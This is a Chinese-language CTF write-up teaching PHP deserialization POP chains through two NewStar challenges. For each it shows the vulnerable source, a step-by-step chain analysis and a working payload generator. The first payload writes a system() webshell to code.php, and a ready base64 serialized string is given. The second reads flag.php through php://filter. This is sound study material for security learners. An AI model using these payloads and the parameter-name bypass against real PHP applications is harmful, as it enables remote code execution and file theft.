# PHP反序列化

**POP链**（Property-Oriented Programming Chain）是利用 PHP 反序列化漏洞时，通过**控制对象属性值**，让程序执行流经过多个类的方法调用，最终触发危险操作的技术。它的核心是**入口 → 桥梁 → 终点**的调用链设计。

在反序列化漏洞中，通常的触发顺序是： `__wakeup` (入口) -> ...中间各种 `__toString`/`__get`/`__invoke` 互相调用... -> `__destruct` (结束)。

++++++++++++++++++++++++++++++

## newstars2024 Week5 臭皮吹泡泡

### 题目内容

```php
 <?php
error_reporting(0);
highlight_file(__FILE__);

class study
{
    public $study;

    public function __destruct()
    {
        if ($this->study == "happy") {
            echo ($this->study);
        }
    }
}
class ctf
{
    public $ctf;
    public function __tostring()
    {
        if ($this->ctf === "phpinfo") {
            die("u can't do this!!!!!!!");
        }
        ($this->ctf)(1);
        return "can can need";
    }
}
class let_me
{
    public $let_me;
    public $time;
    public function get_flag()
    {
        $runcode="<?php #".$this->let_me."?>";
        $tmpfile="code.php";//这里写入了/code.php文件里
        try {
            file_put_contents($tmpfile,$runcode);
            echo ("we need more".$this->time);
            unlink($tmpfile);
        }catch (Exception $e){
            return "no!";
        }

    }
    public function __destruct(){
        echo "study ctf let me happy";
    }
}

class happy
{
    public $sign_in;

    public function __wakeup()
    {
        $str = "sign in ".$this->sign_in." here";
        return $str;
    }
}


$signin = $_GET['new_star[ctf'];
if ($signin) {
    $signin = base64_decode($signin);
    unserialize($signin);
}else{
    echo "你是真正的CTF New Star 吗？ 让我看看你的能力";
} 

 payload));
?>
```

### 思路

在参数传递时，`[` 是非法变量名，会被 PHP 处理成 `_`，这导致我们无法直接传递想要的参数 `new_star[ctf`.

然而，php 这样的处理只会处理一次，在首次处理后不会继续处理随后的违规字符。

因此，当我们传递的参数是 `new[star[ctf` 的时候，php 会处理成 `new_star[ctf`，这样就成功传递了参数。

构建 POP 链的终点是 `let_me` 的 `get_flag()` 函数，这里可以进行文件写入。

```php
$runcode = "<?php #". $this->let_me . "?>";
$tmpfile = "code.php";
try {
    file_put_contents($tmpfile, $runcode); // [!code highlight]
    echo ("we need more" . $this->time);
    unlink($tmpfile);
} catch (Exception $e) {
    return "no!";
}
```

文件前后添加了字符 `<?php #` 和 `?>`，这会把我们写入的 php 代码注释掉，导致不能正常执行。

这里我们可以闭合 php 符号，从而执行 php 代码。

```php
<?php # ?> <?php echo("1");?>
```

文件前后添加了字符 `<?php #` 和 `?>`，这会把我们写入的 php 代码注释掉，导致不能正常执行。

```php
public $ctf;
public function __tostring()
{
    if ($this->ctf === "phpinfo") {
        die("u can't do this!!!!!!!");
    }

    ($this->ctf)(1); // [!code highlight]
    return "can can need";
}
```

这里可以构造一个 `die(1)`，使得文件文件不会被删除就退出，这样就可以完成条件竞争。

#### 关于die()函数

**die()** 是 PHP 中用于**输出一条消息并终止当前脚本**的函数，它是 **exit()** 的别名。常用于在发生错误时立即停止程序执行，并可在退出前输出提示信息。

#### payload

```php
<?php
class study {
    public $study;
}
class ctf {
    public $ctf;
}
class let_me {
    public $let_me;
    public $time;
}

class happy {
    public $sign_in;
}
$payload=new happy();
$payload->sign_in=new ctf();

$exp=new let_me();
$exp->let_me="?> <?php system('cat /f*')";
$exp->time=new ctf();
$exp->time->ctf="die";

$payload ->sign_in->ctf = array($exp,"get_flag");
echo base64_encode(serialize($payload));
?>
```

得到：`new[star[ctf = Tzo1OiJoYXBweSI6MTp7czo3OiJzaWduX2luIjtPOjM6ImN0ZiI6MTp7czozOiJjdGYiO2E6Mjp7aTowO086NjoibGV0X21lIjoyOntzOjY6ImxldF9tZSI7czoyNzoiPz4gPD9waHAgc3lzdGVtKCdjYXQgL2YqJyk7IjtzOjQ6InRpbWUiO086MzoiY3RmIjoxOntzOjM6ImN0ZiI7czozOiJkaWUiO319aToxO3M6ODoiZ2V0X2ZsYWciO319fQ`

发包后访问我们写入的 `code.php`，完成 RCE  

#### array($exp, "get_flag") 有几个关键作用：

**`a) 绕过字符串检查`**

如果直接设置 `$this->ctf = "phpinfo"`，会触发 `ctf::__toString()` 中的检查：

```php
if ($this->ctf === "phpinfo") {
    die("u can't do this!!!!!!!");
}
```

而 `array($exp, "get_flag")` 不是字符串，不会触发这个检查。

**`b) 实现动态方法调用`**

`ctf::__toString()` 中的代码尝试调用 `$this->ctf` 作为一个函数：

php

($this->ctf)(1);

这里的`$payload->sign_in->ctf = array($exp, "get_flag");` 的作用是：

- 创建一个 PHP 可调用回调数组

- 当在 `ctf::__toString()` 中被 `($this->ctf)(1)` 调用时，实际执行 `$exp->get_flag(1)`

- 这是触发 `get_flag()` 方法的关键，利用 PHP 的动态方法调用机制

#### __toString() 函数

是 PHP 中的一个魔术方法，当一个对象被当作字符串使用时会自动调用这个方法。它通常用于在调试时快速获取对象的字符串信息。

完整的触发逻辑

> ```
> 反序列化
> → happy::__wakeup() 
> → 字符串连接触发 ctf::__toString()
> → 调用 $payload->sign_in->ctf (回调数组 array($exp, "get_flag"))
> → let_me::get_flag(1) 被执行
> → 写入 webshell 到 code.php
> → 输出时触发 $exp->time 的 __toString()
> → 嵌套调用或 sleep() 
> → 访问 code.php 执行命令
> ```

## newstars2025 wk4 小羊走迷宫 wp

wp参考文章：https://blog.csdn.net/RisingFan/article/details/153630522

题目给了给迷宫的提示，大概就是说这个pop链的构造就是

__wakeup()  —> __invoke() —> __toString() —> __get()  —> __call()

### 题目内容：

```php
<?php
include "flag.php";
error_reporting(0);
class startPoint{
    public $direction;
    function __wakeup(){
        echo "gogogo出发咯 ";
        $way = $this->direction;
        return $way();
    }
}
class Treasure{
    protected $door;
    protected $chest;
    function __get($arg){
        echo "拿到钥匙咯，开门！ ";
        $this -> door -> open();
    }
    function __toString(){
        echo "小羊真可爱! ";
        return $this -> chest -> key;
    }
}
class SaySomething{
    public $sth;
    function __invoke()
    {
        echo "说点什么呢 ";
        return "说： ".$this->sth;
    }
}
class endPoint{
    private $path;
    function __call($arg1,$arg2){
        echo "到达终点！现在尝试获取flag吧"."<br>";
        echo file_get_contents($this->path);
    }
}

if ($_GET["ma_ze.path"]){
    unserialize(base64_decode($_GET["ma_ze.path"]));
}else{
    echo "这个变量名有点奇怪，要怎么传参呢？";
}
?>               
```

### 涉及的知识点

#### 参数绕过的知识点：$_GET['ma_ze.path']

PHP 变量命名规则：PHP 的变量名不能包含小数点`.`，因为小数点在 PHP 中是无效的变量名字符。为了处理这种情况，PHP 在解析请求参数时会自动将参数名中的 . 替换为 `_`  。
但是，PHP 的变量名解析有一个特性：当遇到左中括号 `[` 时，它会被转换为下划线 `_`，**但是**，在这个 `[` 之后的字符（包括点 `.`）通常不会再被转换，所以可以通过`ma_ze.path`改为`ma[ze.path`进行绕过

#### 伪协议读取文件

`php://filter/read=convert.base64-encode/resource=flag.php`

读取源代码并进行base64编码输出

### payload

```php
<?php
class startPoint{
    public $direction;
    function __construct(){
        //SaySomething.__invoke()
        $this -> direction = new SaySomething();
    }
}
class Treasure{
    protected $door;
    protected $chest;
    function __construct(){
        //Treasure.__get()
        $this -> chest = $this;
        //endPoint.__call()
        $this -> door = new endPoint();
    }
    function __get($arg){
        echo "拿到钥匙咯，开门！ ";
        $this -> door -> open();
    }
    function __toString(){
        echo "小羊真可爱! ";
        return $this -> chest -> key;
    }
}
class SaySomething{
    public $sth;
    function __construct(){
        //Treasure.__toString()
        $this -> sth = new Treasure();
    }
}
class endPoint{
    private $path;
    function __construct(){
        //flag.php
        $this -> path = 'php://filter/read=convert.base64-encode/resource=flag.php';
    }
}


$exp = new startPoint();
echo "ma[ze.path=".base64_encode(serialize($exp));
?>        
```

执行步骤：

当目标服务器接收到这个 Payload 并执行 `unserialize()` 时，POP 链将按以下顺序触发

#### 第一步：入口 (Source)

- **触发位置**: `startPoint::__wakeup()`
- **代码**: `return $way();` (其中 `$way = $this->direction`)
- **分析**:
  - `$this->direction` 被构造为 `SaySomething` 对象。
  - PHP 尝试将 `SaySomething` 对象当作函数调用。
  - **结果**: 触发 `SaySomething::__invoke()`。

#### 第二步：第一次跳转

- **触发位置**: `SaySomething::__invoke()`
- **代码**: `return "说： ".$this->sth;`
- **分析**:
  - 这里进行了字符串拼接。
  - `$this->sth` 被构造为 `Treasure` 对象。
  - PHP 需要将对象转换为字符串。
  - **结果**: 触发 `Treasure::__toString()`。

#### 第三步：巧妙的自引用跳转 (关键点)

- **触发位置**: `Treasure::__toString()`
- **代码**: `return $this -> chest -> key;`
- **分析**:
  - 在构造脚本中：`$this->chest = $this;`。
  - 因此，`$this->chest` 指向了**当前同一个** `Treasure` 对象。
  - 代码实际上变成了访问 `$this->key`。
  - `Treasure` 类定义中**没有**名为 `key` 的属性。
  - 访问不存在的属性。
  - **结果**: 触发**同一个** `Treasure` 对象的 `__get('key')` 方法。

#### 第四步：第二次跳转

- **触发位置**: `Treasure::__get($arg)`
- **代码**: `$this -> door -> open();`
- **分析**:
  - 在构造脚本中：`$this->door = new endPoint();`。
  - 代码变成了调用 `endPoint` 对象的 `open()` 方法。
  - `endPoint` 类中**没有** `open()` 方法。
  - 调用不存在的方法。
  - **结果**: 触发 `endPoint::__call('open', ...)`。

#### 第五步：终点 (Sink)

- **触发位置**: `endPoint::__call()`
- **代码**: `echo file_get_contents($this->path);`
- **分析**:
  - 在构造脚本中：`$this->path` 被设置为 `php://filter/read=convert.base64-encode/resource=flag.php`。
  - 这里使用了 PHP 伪协议读取文件并进行 Base64 编码（这在 CTF 中是一个好习惯，防止 flag 中包含特殊字符导致输出不全，或者绕过某些内容过滤）。
  - **结果**: 读取并输出 `flag.php` 的 Base64 编码内容。

### My Questions

##### 1. 为什么Treasure 类定义中没有名为 key 的属性，然后就会访问不存在的属性会触发__get()方法？

PHP 手册中对 `__get()` 的定义是：

> `__get(string $name)` is utilized for reading data from **inaccessible** (protected or private) or **non-existing** properties.
> （`__get()` 用于读取**不可访问**（protected 或 private）或**不存在**的属性。）

- 代码尝试读取 `$this->chest` 对象下的 `key` 属性。
- PHP 引擎去 `Treasure` 类里找：有没有叫 `key` 的属性？
  - **没有**（类里只定义了 `$door` 和 `$chest`）。
- 因为找不到这个属性，PHP 引擎会检查：这个类有没有定义 `__get()` 方法？
  - **有**。
- **触发**：PHP 自动调用 `__get('key')`，把不存在的属性名 `'key'` 作为参数传进去。

**通俗理解：** `__get()` 就像是网站的 **404 页面**。当你访问一个存在的页面（属性），直接显示给你；当你访问一个不存在的页面（属性），服务器就自动把你转到 404 页面（`__get` 方法）去处理。

#### __toString的触发时机

`__toString()` **只有**在对象被当做字符串使用时（例如 `echo $obj` 或 `$str . $obj`）才会触发。

在这一题中：

`SaySomething::__invoke` 里写了 `"说：".$this->sth`。这里进行了字符串拼接，所以触发了`__toString`

- 对象被当字符串拼接 -> **触发 `__toString`**。
